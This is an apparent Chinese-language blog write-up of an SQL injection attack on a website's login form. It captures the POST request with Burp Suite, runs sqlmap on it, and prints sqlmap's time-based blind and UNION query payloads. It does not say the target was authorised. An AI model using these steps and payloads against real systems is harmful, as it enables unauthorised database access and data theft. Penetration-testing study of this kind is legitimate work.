# 记一次sql注入攻击

对一个网站进行渗透攻击

首先对网站进行简单的测试发现网站有sql的漏洞POST

使用suite进行抓包，把包写进一个xxx.txt的文件中放进sqlmap的文件夹中再使用sqlmap -r xxx.txt --level 3

测试出的结果如下

---
Parameter: #1* ((custom) POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 3941 FROM (SELECT(SLEEP(5)))opJN)-- asUo&password=asdasdasd&submit=%E7%9  %BB%E5%BD%95

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: username=-9490' UNION ALL SELECT NULL,CONCAT(0x71707a7171,0x7345736d754f6b7947566d4a48795575456d4b666970694141794f717264506e726176534f4a7a6b,0x716b626b71),NULL-- -&password=asdasdasd&submit=%E7%9  %BB%E5%BD%95
---

本文使用的是最新的kali linux2021

如果使用的是Windows只要在sqlmap文件夹中开一个cmd再用python运行文件夹中的sqlmap.py文件即可使用

如果对有POST漏洞的网站直接进行简单的-u会直接报错

